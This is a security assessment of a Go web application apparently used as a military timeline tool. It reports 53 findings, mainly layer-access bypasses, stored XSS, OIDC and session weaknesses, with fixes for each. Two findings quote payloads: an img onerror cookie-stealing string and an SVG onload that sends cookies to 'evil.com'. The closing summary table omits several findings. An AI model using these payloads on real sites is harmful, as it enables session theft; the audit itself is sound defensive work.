# Tidslinjal Security Vulnerability Assessment v2

**Date**: 2026-03-17
**Threat Model**: Nation-state adversary with advanced skills, substantial time, and resources
**Scope**: Full application — authentication, authorization, data handling, network, cryptography, concurrency, infrastructure
**Application**: Go web application (military C2 timeline tool) — single-binary, JSON file-backed store

---

## Executive Summary

This second assessment was conducted after an initial round of security fixes. The application has significantly improved — OIDC JWKS verification is now implemented, CSRF protection covers login, rate limiters have cleanup, and many IDOR issues were addressed. However, **critical gaps remain in layer-based access control across multiple data paths**, and several new findings emerge from deeper analysis of session management, SSE broadcasting, export endpoints, and concurrency handling.

**Finding breakdown**: 10 High, 19 Medium, 16 Low, 8 Informational = **53 findings total**

---

## Critical & High Severity Findings

### H-01: SSE Broadcasts Leak Private Layer Events to All Users

**Location**: `main.go:533-539` (`broadcastEventChange`) and all `BroadcastAll` calls
**Severity**: **HIGH**
**CVSS**: 7.5

`broadcastEventChange` sends the full event JSON (including title, description, all fields) to every connected SSE client via `Broadcast()`. There is no filtering by layer visibility. A user on a `read` role who is not a member of a private layer's groups will still receive real-time updates for events created, updated, or deleted on that layer.

This effectively nullifies the entire layer visibility system for any user with an open SSE connection.

**Attack scenario**: Attacker opens an SSE connection (`/api/sse`), then passively receives all event changes across all layers, including classified or compartmented layers they have no access to.

**Remediation**: Before broadcasting event changes, check each SSE client's layer visibility. Either:
- Filter per-client at broadcast time (checking `canReadLayer` for the event's layer)
- Or send a generic "refresh" notification and let the client re-fetch (with proper server-side filtering)

---

### H-02: Export Endpoints Bypass Layer Visibility (ICS, XLSX, STIX, Reports)

**Location**:
- `main.go:4797` — ICS export: `app.store.GetEventsInRange(from, to)` — **no layer filter**
- `main.go:8009` — XLSX export: `app.store.GetEvents(from, to, nil)` — **no layer filter**
- `connector_stix.go:259` — STIX export: `app.store.GetEventsInRange(...)` — **no layer filter**
- `main.go:7476` — Report download: `app.store.GetEvents(from, to, nil)` — **no layer filter**
- `main.go:7602` — Auto-report email: `app.store.GetEvents(...)` — **no layer filter**
- `main.go:10871` — Stats export: `app.allEvents()` — **no layer filter, only requireAuth**
- `main.go:8964` — Narrative: `app.store.GetEventsInRange(...)` — **no layer filter**
- `main.go:13393` — WebCal: delegates to ICS export — **no layer filter, token-authenticated**
- `main.go:8783+` — 13+ statistics endpoints: `app.allEvents()` — **no layer filter**

**Severity**: **HIGH**
**CVSS**: 7.5

While `handleGetEvents` (the primary event listing API) was fixed to filter by visible layers, all export endpoints still return every event regardless of the requesting user's layer access. Any authenticated user can export the entire event database including private/group-restricted layer events.

**Attack scenario**: A `read`-role user who shouldn't see classified layer data hits `/api/export/ics` or `/api/export/xlsx` and gets every event in the system.

**Remediation**: Apply the same `visibleLayerIDs` filtering logic used in `handleGetEvents` to all export handlers. Create a shared helper like `app.getVisibleEvents(user, from, to)` to prevent future divergence.

---

### H-03: Comments and Attachments Listed Without Layer Access Check

**Location**:
- `main.go:2496-2513` — `handleGetAttachments`: returns all attachments for any event ID
- `main.go:4212-4228` — `handleGetComments`: returns all comments for any event ID

**Severity**: **HIGH**
**CVSS**: 6.5

Both handlers take an event ID from the URL path and return associated data without checking whether the requesting user can read the event's layer. While attachment download (`handleDownloadAttachment`) was fixed with a `canReadLayer` check, the listing endpoint was not. An attacker can enumerate event IDs (sequential integers) and read all comments/attachments metadata for events on private layers.

**Attack scenario**: Iterate through `/api/events/1/comments`, `/api/events/2/comments`, etc. to read all comments including those on restricted layers. Comments often contain operational details more sensitive than the event titles themselves.

**Remediation**: Add `canReadLayer` check at the start of both handlers, similar to the fix in `handleDownloadAttachment`.

---

### H-04: handleUpdateEvent Missing Layer Write Check

**Location**: `main.go:2314-2317`
**Severity**: **HIGH**

The update handler checks `existing.CreatedBy != user.ID && !hasRole(user.Role, RoleReadWrite)` but never calls `canWriteLayer`. A user with `RoleReadWrite` can modify events on any private layer, even ones they have no group membership for. Compare with `handleCreateEvent` (line 2233) which correctly calls `canWriteLayer`.

**Attack scenario**: A `readwrite` user not in any groups modifies events on a group-restricted private layer.

**Remediation**: Add `canWriteLayer` check when `existing.LayerID != nil`, matching the pattern in `handleCreateEvent`.

---

### H-05: Stored XSS via Multiple Unsanitized Fields

**Location**:
- `main.go:3402-3423` — Event log entries: `Message`, `Summary`, `Source`, `Data` — **no `stripHTMLTags`**
- `main.go:2825-2857` — Group name/description — **no sanitization**
- `main.go:9561-9581` — Room name/description — **no sanitization**
- `main.go:9365-9387` — Map location name — **no sanitization**
- `main.go:1342-1345` — User display name at registration — **no sanitization**
- `main.go:3230-3237` — User display name at admin creation/update — **no sanitization**

**Severity**: **HIGH**

While event titles/descriptions are sanitized with `stripHTMLTags()`, many other user-supplied text fields bypass sanitization entirely. Display names appear throughout the app (comments, audit logs, presence indicators). Group names appear in layer UIs and dropdown selectors.

**Attack scenario**: A user self-registers with `display_name` set to `<img src=x onerror=alert(document.cookie)>`. Every time their name renders in another user's browser (comments, audit trail, event created-by), the XSS fires and steals session cookies. Alternatively, a TeamLead creates a group with a script tag in the name.

**Remediation**: Apply `stripHTMLTags()` to all user-supplied text fields at every write handler: event log entries, group name/description, room name/description, map location name, user display name, template name/description.

---

### H-06: Stored XSS via SVG Upload as Map Resource

**Location**: `main.go:12407` (allowed extensions include `.svg`), `main.go:12489-12504` and `main.go:14222-14231` (served via `http.ServeFile`)
**Severity**: **HIGH**

Map resource uploads explicitly allow `.svg` files. SVG files can contain embedded JavaScript (`<script>`, `onload`, etc.). Files are served via `http.ServeFile` with the original content type (`image/svg+xml`). When the browser renders the SVG directly (navigating to the file URL), JavaScript executes in the application's origin.

The `handleMapResourceFile` endpoint may not require authentication and does not set `Content-Disposition: attachment`.

**Attack scenario**: A TeamLead uploads an SVG containing `<svg onload="fetch('https://evil.com/'+document.cookie)">`. Any user navigating to `/api/map-resources/{id}/file` executes the script, leaking cookies.

**Remediation**: Either (a) remove `.svg` from allowed extensions, (b) set `Content-Disposition: attachment` on all served files, (c) serve from a separate origin, or (d) sanitize SVG content on upload. Also ensure authentication is required.

---

### H-07: Sessions Not Invalidated After Self-Service Password Change

**Location**: `main.go:1130-1189` (`handleChangePassword`)
**Severity**: **HIGH**

The self-service password change endpoint updates the password hash but does not call `app.store.DeleteSessionsForUser(user.ID)`. The admin endpoint `handleUpdateUser` (line 3317) correctly invalidates sessions. This means a compromised session persists even after the victim changes their password.

Similarly, `handleResetPassword` (line 1905-1958, the forgot-password token flow) also does not invalidate existing sessions.

**Attack scenario**: Attacker steals a session cookie. Victim changes password. Attacker retains access for up to 24 hours.

**Remediation**: Add `app.store.DeleteSessionsForUser(user.ID)` to both `handleChangePassword` and `handleResetPassword`, matching the pattern in `handleUpdateUser`.

---

### H-08: Data Race in GetDBStats — Write Under RLock

**Location**: `store.go:554-555`
**Severity**: **HIGH**

`GetDBStats()` acquires an `RLock` (shared read lock) at line 530 but then writes to `s.cachedDBStats` and `s.cachedDBStatsAt` at lines 554-555. Multiple goroutines can hold `RLock` concurrently, so two simultaneous calls write to the same fields without mutual exclusion — a textbook Go data race causing undefined behavior.

**Remediation**: Use a full `s.mu.Lock()` when updating the cache, or use a separate `sync.Mutex` for the cache fields.

---

### H-09: Zip Bomb in Backup Restore — No Decompressed Size Limit

**Location**: `store.go:3536` and `main.go:13346`
**Severity**: **HIGH**

When restoring backups, individual ZIP entries are read with `io.ReadAll(rc)` with no size limit on decompressed data. A zip bomb (small compressed, huge decompressed) will exhaust memory and crash the server.

**Remediation**: Use `io.LimitReader(rc, maxDecompressedSize)` (e.g., 100MB per file) when extracting ZIP entries.

---

### H-10: TOCTOU Race Conditions in Read-Modify-Write Handlers

**Location**: Multiple handlers including `main.go:1148-1179` (`handleChangePassword`), `main.go:3227-3339` (`handleUpdateUser`)
**Severity**: **HIGH**

Handlers read a user/event with `GetUserByID`, modify fields in the handler, then call `UpdateUser`. If another goroutine modifies the same record between read and write, the update overwrites all fields with the stale copy, silently reverting the other change.

**Attack scenario**: Admin changes user A's role to "observer". Simultaneously, user A changes their password. The password change reads the old record (with elevated role), sets new hash, writes back — reverting the role change. User A retains elevated privileges.

**Remediation**: Implement optimistic concurrency (version field check) or use a compare-and-swap pattern in the store.

---

## Medium Severity Findings

### M-01: OIDC JWT Algorithm Confusion (HMAC Accepted Alongside JWKS)

**Location**: `main.go:13805-13826` (`validateIDToken`)
**Severity**: **MEDIUM**

The token validator accepts HMAC-based algorithms (HS256/384/512) using the client secret, AND RSA/EC algorithms using JWKS. It does not enforce which algorithm the provider is expected to use. If the provider uses RS256 but the client secret is weak, an attacker who knows the secret can forge tokens using `alg: HS256`.

The OIDC spec recommends that clients only accept the algorithm the provider is known to use.

**Remediation**: After fetching JWKS, determine the provider's expected algorithm family. If the JWKS contains RSA/EC keys, reject HMAC tokens. Store the expected algorithm in `OIDCConfig`.

---

### M-02: OIDC Discovery SSRF — No Private IP Filtering

**Location**: `main.go:13543` and `main.go:1543`
**Severity**: **MEDIUM**

`configureOIDC` and the OIDC test endpoint use `http.Get(discURL)` with the default HTTP client, which has no SSRF protection. The token endpoint call (`http.PostForm`, line 14014) and userinfo fetch (`http.DefaultClient.Do`, line 14043) also use unprotected clients. While these URLs come from the admin-configured issuer, a compromised admin account can use them for SSRF against cloud metadata endpoints or internal services.

The webhook system uses `newSSRFSafeTransport()` — the same protection should apply here.

**Remediation**: Use `newSSRFSafeTransport()` for OIDC discovery, token exchange, and userinfo fetches.

---

### M-03: OIDC PKCE and Nonce Not Required (Graceful Degradation to No Protection)

**Location**: `main.go:13977-13990`
**Severity**: **MEDIUM**

The OIDC callback silently falls through if the PKCE cookie or nonce cookie is missing. If `oidc_pkce` is absent, `codeVerifier` is `""` and the token exchange proceeds without PKCE. If `oidc_nonce` is absent, `expectedNonce` is `""` and the nonce check is skipped (line 13954: `if expectedNonce != "" && ...`).

A network attacker who strips cookies can downgrade the OIDC flow.

**Remediation**: Require both cookies to be present; reject the callback with an error if either is missing.

---

### M-04: handleDeleteEvent Missing Layer Access Check

**Location**: `main.go:2476`
**Severity**: **MEDIUM**

`handleDeleteEvent` only checks `existing.CreatedBy != user.ID && !hasRole(user.Role, RoleAdmin)`. An admin can delete events on any layer (which may be acceptable), but there's no `canWriteLayer` check for non-admin users who created the event — a user who created an event then lost group access could still delete it.

**Remediation**: Add `canWriteLayer` check when `existing.LayerID != nil` and the user is not an admin.

---

### M-05: Logout Endpoint Accepts GET (CSRF Logout)

**Location**: `main.go:1079-1093` — route at line 5473
**Severity**: **MEDIUM**

`handleLogout` has no method check and is not wrapped by `requireAuth`, so CSRF protection (X-Requested-With header check) does not apply. A `<img src="/api/auth/logout">` on any page will silently log the user out. In a military C2 context, forced logout during operations is a denial-of-service concern.

**Remediation**: Restrict to POST and wrap with `requireAuth` to enforce CSRF header check.

---

### M-06: Webhook Payloads Include Full Event Data Without Layer Filtering

**Location**: `main.go:542` (`go app.fireWebhooks(action, ev)`)
**Severity**: **MEDIUM**

`broadcastEventChange` fires webhooks with full event data for all events. Webhook URLs are configured per-user. If a user configures a webhook and another user creates an event on a private layer, the webhook may send the full event content to the first user's endpoint.

**Remediation**: Check whether the webhook owner has `canReadLayer` access before including the event in the payload.

---

### M-07: Webhook HTTP Client Follows Redirects (SSRF Bypass Vector)

**Location**: `main.go:722` (`runWebhookWorker`)
**Severity**: **MEDIUM**

The webhook `http.Client` (line 722) has no `CheckRedirect` function set. While the custom `DialContext` in `newSSRFSafeTransport()` blocks connections to private IPs at dial time, the client follows HTTP 302/307 redirects by default. An attacker could set a webhook to `https://evil.com/redirect` which passes SSRF validation (public IP), then `evil.com` returns a redirect to `http://internal-service:8080/`. The safe transport's DialContext should block this at connection time, but adding an explicit redirect policy provides defense-in-depth.

**Remediation**: Set `CheckRedirect` on the webhook client to re-validate each redirect URL against private IP ranges, or disable redirects entirely for webhooks.

---

### M-08: Session Tokens and Password Reset Tokens Stored in Plaintext on Disk

**Location**: `store.go` — sessions.json, users.json (reset tokens)
**Severity**: **MEDIUM**

Session IDs are stored in plaintext in `sessions.json`. Password reset tokens are stored directly in user records. If an attacker gains filesystem read access (e.g., via a backup leak, LFI, or compromised adjacent service), they get all active sessions.

**Remediation**: Store only SHA-256 hashes of session tokens and reset tokens. Compare using `subtle.ConstantTimeCompare` on the hash.

---

### M-09: OIDC Discovery Issuer Not Validated

**Location**: `main.go:13536-13562`
**Severity**: **MEDIUM**

`configureOIDC` fetches the discovery document but does not verify that the `issuer` field in the returned JSON matches the configured issuer URL. Per OpenID Connect Discovery spec §4.3, the client MUST verify this. A compromised or redirected discovery endpoint could return token/userinfo endpoints pointing to an attacker-controlled server.

**Remediation**: After decoding the discovery document, verify `cfg.Issuer == issuer`.

---

### M-10: No Concurrent Session Limit / No Session Limit Per User

**Location**: `main.go:1028-1046`
**Severity**: **MEDIUM**

There is no limit on active sessions per user. Each login creates a new 24-hour session. An attacker with stolen credentials can create unlimited sessions, making it hard to revoke all access even if the password is changed (unless `DeleteSessionsForUser` is called).

**Remediation**: Limit to N concurrent sessions per user (e.g., 10). On new login, if the limit is reached, either reject or expire the oldest session.

---

### M-11: No SSE Connection Limit Per User/IP

**Location**: `main.go:334-345` (`SSEBroker.Subscribe`)
**Severity**: **MEDIUM**

There is no limit on concurrent SSE connections per user or per IP. Each SSE connection holds a goroutine and two buffered channels. An attacker with a single session can open thousands of SSE connections, exhausting server goroutines and file descriptors.

**Remediation**: Limit to 5 SSE connections per user and 20 per IP. Drop oldest connection when limit is exceeded.

---

### M-12: Connector Config API Returns Secrets in Plaintext

**Location**: Connector config GET endpoint
**Severity**: **MEDIUM**

The connector config GET endpoint returns raw `Config` JSON which may contain API keys, tokens, and passwords for GitHub, Jira, Google Calendar, and STIX connectors. While admin-only, secrets should be masked in API responses.

**Remediation**: Strip or mask secret fields (api_key, token, password) in connector config GET responses, similar to how OIDC client_secret is masked.

---

### M-13: No fsync Before Rename in saveFile — Data Loss on Power Failure

**Location**: `store.go:588-604`
**Severity**: **MEDIUM**

The write pattern is write-to-temp-then-rename (good for atomicity), but there is no `f.Sync()` before `f.Close()`. On Linux, the data may still be in the page cache when `os.Rename()` is called. Power loss after rename but before kernel flush results in a zero-byte or truncated file. Combined with `loadFile` silently ignoring decode errors (line 579-586), this means a crash can silently lose an entire data collection.

**Remediation**: Add `f.Sync()` before `f.Close()` in `saveFile`.

---

### M-14: Unbounded Data Growth in Collections (Memory/Disk Exhaustion)

**Location**: `store.go` — events, comments, sessions, notifications, logBook, decisionLog, polls
**Severity**: **MEDIUM**

While audit is capped at 10,000 entries and eventVersions at 5,000, most collections have no growth limit. An attacker with `RoleReadWrite` can create unlimited events and comments, growing in-memory slices until OOM. Each create also serializes the entire collection to disk, causing write amplification.

**Remediation**: Add configurable caps to major collections. Alert when thresholds are approached.

---

### M-15: UserPublic Struct Leaks Sensitive Operational Data

**Location**: `models.go:146-183`
**Severity**: **MEDIUM**

`UserPublic` exposes `LastFailedLoginIP`, `LastFailedLoginAt`, `PrevLoginIP`, `PrevLoginDomain`, `Location`, `Latitude`, `Longitude`, and `Blocked`/`MustChangePassword` flags to any authenticated user. This aids reconnaissance.

**Remediation**: Only expose these fields to the user themselves or admins. Use a separate `UserSelf` struct for the current user's full profile.

---

### M-16: Backup Restore io.Copy Bypasses ParseMultipartForm Size Limit

**Location**: `main.go:13297-13301`
**Severity**: **MEDIUM**

`ParseMultipartForm(64<<20)` limits in-memory portion to 64MB but spills the rest to disk. The subsequent `io.Copy(buf, file)` reads the entire file (potentially multi-GB from the temp file) into memory with no limit.

**Remediation**: Use `io.LimitReader(file, maxBackupSize)` in the `io.Copy` call.

---

### M-17: Restored Files Written with 0644 (World-Readable)

**Location**: `store.go:3541` and `store.go:3401`
**Severity**: **MEDIUM**

Gradual backup restore writes restored data files with 0644 permissions instead of 0600. Until the next normal persist cycle, sensitive files (users, sessions, API keys) are world-readable on the filesystem.

**Remediation**: Use 0600 for all data file writes, matching `saveFile`.

---

### M-18: No File Type Validation on Event/Logbook/Decision Attachments

**Location**: `main.go:2515-2581`, `main.go:3493-3547`, `main.go:8587-8639`
**Severity**: **MEDIUM**

Unlike map resources (which have an extension allowlist), event, logbook, and decision log attachments accept any file type. Users can upload `.html` or `.svg` files containing scripts. While `handleDownloadAttachment` sets `Content-Disposition: attachment` (forcing download), some browsers may still render inline in edge cases.

**Remediation**: Add a file type allowlist or blocklist. At minimum, ensure `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` on all served attachment files.

---

### M-19: Stored XSS via Template Names and Content

**Location**: `main.go:4478-4512`
**Severity**: **MEDIUM**

`handleCreateTemplate` stores `tmpl.Name`, `tmpl.Description`, and template `Items` (event titles/descriptions) without `stripHTMLTags()`.

**Remediation**: Apply `stripHTMLTags()` to template name, description, and all item text fields.

---

## Low Severity Findings

### L-01: `handleUploadAttachment` Missing Layer Write Check

**Location**: `main.go:2515`
**Severity**: **LOW**

The upload handler extracts the event ID from the path and saves an attachment without verifying the user has write access to the event's layer. However, since it does require authentication, the risk is limited to authenticated users uploading to events on layers they shouldn't write to.

**Remediation**: Add `canWriteLayer` check similar to `handleCreateEvent`.

---

### L-02: `handleCreateComment` Missing Layer Write Check

**Location**: `main.go:4231`
**Severity**: **LOW**

Similar to L-01. Comments can be added to any event by any authenticated user without checking layer write access.

**Remediation**: Add layer visibility/write check before creating the comment.

---

### L-03: Auto-Report Email Includes All Events

**Location**: `main.go:7602`
**Severity**: **LOW**

The automated report email system sends reports containing all events without layer filtering. Since the recipient is configured by an admin, the risk is contextual, but it may leak restricted-layer data to recipients who shouldn't see it.

**Remediation**: Filter events by the report recipient's layer visibility.

---

### L-04: API Key Validation O(N) Bcrypt with Timing Side-Channel

**Location**: `store.go:2950-2976`
**Severity**: **LOW**

`ValidateAPIKey` iterates all API keys with bcrypt comparison. The number of keys is leaked via timing — first key is validated faster than the last. Minor given bcrypt's inherent protection.

**Remediation**: Consider HMAC-based key validation or a hash-indexed lookup.

---

### L-05: OIDC Callback Uses `r.RemoteAddr` Instead of `clientIP(r)`

**Location**: `main.go:14183`
**Severity**: **LOW**

The OIDC login tracking at line 14183 uses raw `r.RemoteAddr` while the normal login handler correctly uses `clientIP(r)`. Behind a reverse proxy, OIDC logins will show the proxy's address.

**Remediation**: Replace with `clientIP(r)`.

---

### L-06: `handleDeleteAttachment` Does Not Check Layer Write Permission

**Location**: `main.go:2615-2666`
**Severity**: **LOW**

The attachment delete handler checks `canReadLayer` (from the previous fix) but not `canWriteLayer`. A user with read-only access to a layer can delete attachments on that layer's events.

**Remediation**: Change to `canWriteLayer` check, or additionally require that the user is the attachment uploader or an admin.

---

### L-07: OIDC Routes Not Registered Dynamically

**Location**: `main.go:5957-5962`
**Severity**: **LOW**

OIDC routes (`/auth/oidc/login`, `/auth/oidc/callback`) are only registered at startup if `app.oidc != nil`. If OIDC is configured at runtime via admin panel, the routes don't exist until restart. An admin may believe SSO is active when it isn't.

**Remediation**: Always register the routes; have handlers check `app.oidc != nil` at request time.

---

### L-08: `handleGetEventHistory` Missing Layer Access Check

**Location**: `main.go:5566-5569`
**Severity**: **LOW**

Event version history is accessible for any event ID without layer visibility check. Exposes change history of events on restricted layers.

**Remediation**: Add `canReadLayer` check.

---

### L-09: `handlePatchEventStatus` Missing Layer Access Check

**Location**: `main.go:2393-2462`
**Severity**: **LOW**

Status changes check role-based permission but never verify the user can access the event's layer. A reporter can change the status of events on private layers.

**Remediation**: Add `canWriteLayer` check.

---

### L-10: Editing Lock Can Be Acquired on Private Layer Events

**Location**: `main.go:12971-12981`
**Severity**: **LOW**

Editing lock handlers do not check layer visibility. A user can acquire a lock on a private-layer event, blocking legitimate editors (DoS on editing).

**Remediation**: Add `canReadLayer` check before allowing lock acquisition.

---

### L-11: Activity Feed Leaks Event Titles from Private Layers

**Location**: `main.go:4772`
**Severity**: **LOW**

The activity feed returns audit log entries containing event titles from all layers. Summaries like "Created event 'Secret Op X'" leak private layer data.

**Remediation**: Filter audit entries by the requesting user's visible layers, or redact event titles for entries referencing inaccessible layers.

---

### L-12: Geo Items and Map Overlays Writable by Any Authenticated User

**Location**: `main.go:6992-6993` (geo items), `main.go:7020-7054` (overlays/drawings)
**Severity**: **LOW**

`PUT /api/geo-items` and map overlay/drawing endpoints only require `requireAuth`, allowing observer/read-only users to modify map content. These should require `RoleReadWrite` or `RoleTeamLead`.

**Remediation**: Wrap these endpoints with `requireRole(RoleReadWrite, ...)` or `requireRole(RoleTeamLead, ...)`.

---

### L-13: 13+ Statistics Endpoints Bypass Layer Visibility

**Location**: `main.go:8783, 8820, 8843, 8852, 8861, 8882, 10564, 10625, 10788, 10871, 10946, 11476, 11709`
**Severity**: **LOW**

All stats handlers use `app.allEvents()` with zero layer filtering. While stats are aggregate (counts, percentages), they still leak information about private layer events — an observer can learn how many events exist on layers they can't see, their types, and timing patterns.

**Remediation**: Apply layer filtering to `allEvents()` calls in stats handlers, or create a `app.visibleEvents(user)` helper.

---

### L-14: Popup Endpoints Missing CSRF Protection

**Location**: `decision-log-popup.html`, `resources-popup.js` (frontend)
**Severity**: **LOW**

The popup windows for decision log and resources make fetch calls without the `X-Requested-With: XMLHttpRequest` header that `requireAuth` middleware checks for CSRF protection. This means these popup-initiated requests would be rejected by the server — indicating the feature is currently broken, or the CSRF check is being bypassed in another way.

**Remediation**: Ensure all frontend fetch calls include `X-Requested-With: XMLHttpRequest` header. Audit popup JavaScript for consistency.

---

### L-15: No Graceful Shutdown — `os.Exit(0)` in Admin Restart Handler

**Location**: `main.go` — admin restart/shutdown handler
**Severity**: **LOW**

The admin restart handler calls `os.Exit(0)` directly, which does not allow in-flight HTTP requests to complete, does not flush pending file writes, and does not close SSE connections cleanly. On a busy server, this can cause data loss for requests being processed at the time of restart.

**Remediation**: Use `http.Server.Shutdown(ctx)` with a deadline (e.g., 30 seconds) to allow in-flight requests to complete before exiting. Also handle SIGTERM/SIGINT for clean process shutdown.

---

### L-16: Static Directory Listings Exposed via `http.FileServer`

**Location**: `main.go` — static file serving routes
**Severity**: **LOW**

`http.FileServer` serves directory listings by default when no `index.html` exists in a directory. This exposes the directory structure of static assets, which leaks internal naming conventions and file organization to attackers.

**Remediation**: Wrap the file server handler with one that returns 404 for directory requests, or ensure all static directories contain an `index.html`.

---

## Informational Findings

### I-01: MD5 and SHA-1 Used for Attachment Checksums

**Location**: Various attachment handlers
**Severity**: **INFO**

MD5 and SHA-1 are computed alongside SHA-256/512 for file checksums. Not used for security purposes (deduplication/integrity only), but auditors may flag it.

---

### I-02: `SkipVerify` Option in LDAP Configuration

**Location**: `connector_ldap.go:31`
**Severity**: **INFO**

LDAP config includes `skip_verify` to disable TLS certificate verification. LDAP is currently a stub, but when implemented, this option should be removed or restricted to development environments.

---

### I-03: Registration Mode "open" Auto-Vets Users

**Location**: `main.go:1348`
**Severity**: **INFO**

When registration mode is "open", users are immediately vetted (`vetted := rs.Mode != "vetted"`). This is by design but worth noting — an admin mistakenly setting "open" mode exposes the system to unauthenticated account creation.

---

### I-04: `style-src 'unsafe-inline'` in CSP

**Location**: `main.go:5247`
**Severity**: **INFO**

The Content-Security-Policy includes `style-src 'self' 'unsafe-inline'` which weakens CSS injection protection. Inline styles are needed for the current frontend but should be migrated to external stylesheets.

---

### I-05: No Request Size Limit on Multipart Forms

**Location**: Various `ParseMultipartForm` calls
**Severity**: **INFO**

While `decode()` limits JSON bodies to 1MB, multipart form uploads vary: 10MB for imports, 20MB for attachments, 64MB for backup restore. These are reasonable but should be documented and reviewed.

---

### I-06: Backup Encryption Key Derived from Admin Password Hash

**Location**: `main.go:13269`, `store.go:1017`
**Severity**: **INFO**

Backup encryption uses the admin account's bcrypt hash as PBKDF2 key material. If the admin password is changed, old encrypted backups become undecryptable (no key rotation mechanism). Additionally, if the admin password is weak, the backup encryption is proportionally weak.

---

### I-07: CSP Conflicts with Inline Scripts in Popup HTML Files

**Location**: Popup HTML files (`decision-log-popup.html`, etc.)
**Severity**: **INFO**

Several popup HTML files contain inline `<script>` tags, but the CSP policy sets `script-src 'self'` (no `'unsafe-inline'`). This means inline scripts in popups are blocked by CSP. Either the popups are non-functional, or they are served without CSP headers (which would be a separate concern).

**Remediation**: Move all inline scripts to external `.js` files to comply with CSP, or verify that popup routes inherit the main application's security headers.

---

### I-08: `requireAPIKeyOrAuth` Middleware Defined but Never Wired

**Location**: `main.go` — middleware definition and routes
**Severity**: **INFO**

A `requireAPIKeyOrAuth` middleware function is defined but not used in any route registration. This suggests either dead code from a planned feature, or a regression where API key authentication was intended for certain endpoints but never connected.

**Remediation**: Either wire the middleware to appropriate endpoints (e.g., automation/integration endpoints) or remove the dead code to reduce attack surface confusion.

---

## Security Hardening Recommendations

### Architecture

1. **Centralize layer visibility enforcement**: Create a single function like `app.getVisibleEvents(user, from, to)` that all handlers, exports, broadcasts, and webhooks use. The current approach of individually fixing each endpoint is error-prone.

2. **Move to middleware-based authorization**: Instead of checking roles inside handlers, use route-level middleware that declares required permissions. This makes it easier to audit and prevents forgotten checks.

3. **Add integration tests for layer isolation**: Create tests that verify a user without layer access cannot read events, comments, attachments, exports, or SSE broadcasts from that layer.

### Authentication & Sessions

4. **Hash session tokens at rest**: Store `SHA-256(sessionID)` in sessions.json. Compare with hash on lookup. This prevents mass session theft via file disclosure.

5. **Implement session limits**: Cap concurrent sessions per user (e.g., 10). Provide a "terminate all sessions" button in the UI.

6. **Pin OIDC algorithm**: When JWKS contains RSA/EC keys, reject HMAC tokens. This prevents algorithm confusion attacks.

7. **Require PKCE and nonce**: Make both mandatory in the OIDC callback. Fail loudly if cookies are missing.

### Network Security

8. **Apply SSRF protection to all outbound HTTP**: Use `newSSRFSafeTransport()` for OIDC discovery, token exchange, and userinfo endpoints — not just webhooks.

9. **Add `Secure` cookie flag detection for reverse proxy**: Detect `X-Forwarded-Proto: https` and set `Secure` flag accordingly, or add a CLI flag `--behind-https-proxy`.

10. **Rate limit SSE connections**: Limit concurrent SSE connections per user (e.g., 5) and per IP (e.g., 20) to prevent resource exhaustion.

### Data Protection

11. **Encrypt sensitive JSON files at rest**: At minimum, `sessions.json` and `users.json` (which contains password hashes) should be encrypted or have restricted filesystem permissions enforced.

12. **Add backup key rotation**: Allow re-encrypting backups when the admin password changes, or use a separate dedicated backup encryption key.

### Monitoring & Audit

13. **Audit all export operations with scope**: Log which user exported what data, including whether layer filtering was applied.

14. **Alert on anomalous session patterns**: Multiple concurrent sessions from different IPs for the same user should trigger an alert.

15. **Add security event logging for OIDC**: Log algorithm used, kid, issuer match results, and PKCE/nonce presence for each OIDC authentication.

---

## Summary Table

| ID | Severity | Category | Finding |
|----|----------|----------|---------|
| H-01 | HIGH | AuthZ | SSE broadcasts leak private layer events to all users |
| H-02 | HIGH | AuthZ | Export endpoints (ICS/XLSX/STIX/Reports) bypass layer visibility |
| H-03 | HIGH | AuthZ | Comments and attachments listed without layer access check |
| H-04 | HIGH | AuthZ | handleUpdateEvent missing layer write check |
| H-05 | HIGH | XSS | Stored XSS via unsanitized fields (display name, groups, rooms, event log, map locations) |
| H-06 | HIGH | XSS | Stored XSS via SVG upload as map resource (served inline with JS) |
| H-07 | HIGH | AuthN | Sessions not invalidated after self-service password change/reset |
| H-08 | HIGH | Concurrency | Data race in GetDBStats — write under RLock |
| H-09 | HIGH | DoS | Zip bomb in backup restore — no decompressed size limit |
| H-10 | HIGH | Concurrency | TOCTOU race conditions in read-modify-write handlers |
| M-01 | MEDIUM | Crypto | OIDC JWT algorithm confusion (HMAC alongside JWKS) |
| M-02 | MEDIUM | SSRF | OIDC discovery/token/userinfo use unprotected HTTP client |
| M-03 | MEDIUM | AuthN | OIDC PKCE and nonce not required |
| M-04 | MEDIUM | AuthZ | handleDeleteEvent missing layer access check |
| M-05 | MEDIUM | CSRF | Logout endpoint accepts GET (CSRF logout) |
| M-06 | MEDIUM | AuthZ | Webhook payloads include events from all layers |
| M-07 | MEDIUM | SSRF | Webhook HTTP client follows redirects without re-validation |
| M-08 | MEDIUM | Data | Session/reset tokens stored in plaintext on disk |
| M-09 | MEDIUM | AuthN | OIDC discovery issuer not validated |
| M-10 | MEDIUM | AuthN | No concurrent session limit |
| M-11 | MEDIUM | DoS | No SSE connection limit per user/IP |
| M-12 | MEDIUM | Data | Connector config API returns secrets in plaintext |
| M-13 | MEDIUM | Data | No fsync before rename in saveFile — data loss on power failure |
| M-14 | MEDIUM | DoS | Unbounded data growth in events, comments, logs |
| M-15 | MEDIUM | Data | UserPublic leaks IPs, locations, security state |
| M-16 | MEDIUM | DoS | Backup restore io.Copy bypasses multipart size limit |
| M-17 | MEDIUM | Data | Restored files written with 0644 instead of 0600 |
| M-18 | MEDIUM | XSS | No file type validation on event/logbook/decision attachments |
| M-19 | MEDIUM | XSS | Stored XSS via template names and content |
| L-01 | LOW | AuthZ | handleUploadAttachment missing layer write check |
| L-02 | LOW | AuthZ | handleCreateComment missing layer write check |
| L-03 | LOW | AuthZ | Auto-report email includes all events |
| L-04 | LOW | Crypto | API key validation O(N) bcrypt timing |
| L-05 | LOW | Logging | OIDC callback uses r.RemoteAddr not clientIP |
| L-06 | LOW | AuthZ | handleDeleteAttachment checks read not write |
| L-07 | LOW | Config | OIDC routes not registered dynamically |
| L-08 | LOW | AuthZ | handleGetEventHistory missing layer access check |
| L-09 | LOW | AuthZ | handlePatchEventStatus missing layer access check |
| L-10 | LOW | AuthZ | Editing lock can be acquired on private layer events |
| L-11 | LOW | Data | Activity feed leaks event titles from private layers |
| L-12 | LOW | AuthZ | Geo items and map overlays writable by any authenticated user |
| L-13 | LOW | AuthZ | 13+ statistics endpoints bypass layer visibility |
| L-14 | LOW | CSRF | Popup endpoints missing X-Requested-With CSRF header |
